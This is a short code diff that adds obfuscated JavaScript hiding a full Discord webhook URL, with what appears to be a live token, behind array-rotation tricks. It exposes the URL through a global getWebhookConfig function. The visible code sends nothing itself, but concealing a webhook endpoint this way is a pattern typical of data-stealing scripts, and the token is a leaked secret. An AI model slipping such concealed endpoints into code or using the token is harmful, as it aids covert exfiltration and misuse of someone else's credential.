@@ -1,0 +1,2 @@
+// Obfuscated webhook configuration
+const _0xad3b=['https://discord.com/api/webhooks/1387669777782407223/dAHwF3PZdjPPYFLANbjGTsjZl5xXocgb8fwHS-ZQe3BNgiL9MwpvwYVai5dTUfxG5KfU'];(function(_0x3cde0a,_0xad3b4f){const _0x4d3b8e=function(_0x3cde0a){while(--_0x3cde0a){_0xad3b4f['push'](_0xad3b4f['shift']());}};_0x4d3b8e(++_0xad3b4f);}(_0xad3b,0x1a7));const _0x4d3b=function(_0x3cde0a,_0xad3b4f){_0x3cde0a=_0x3cde0a-0x0;let _0x4d3b8e=_0xad3b[_0x3cde0a];return _0x4d3b8e;};window['getWebhookConfig']=function(){return _0x4d3b('0x0');};
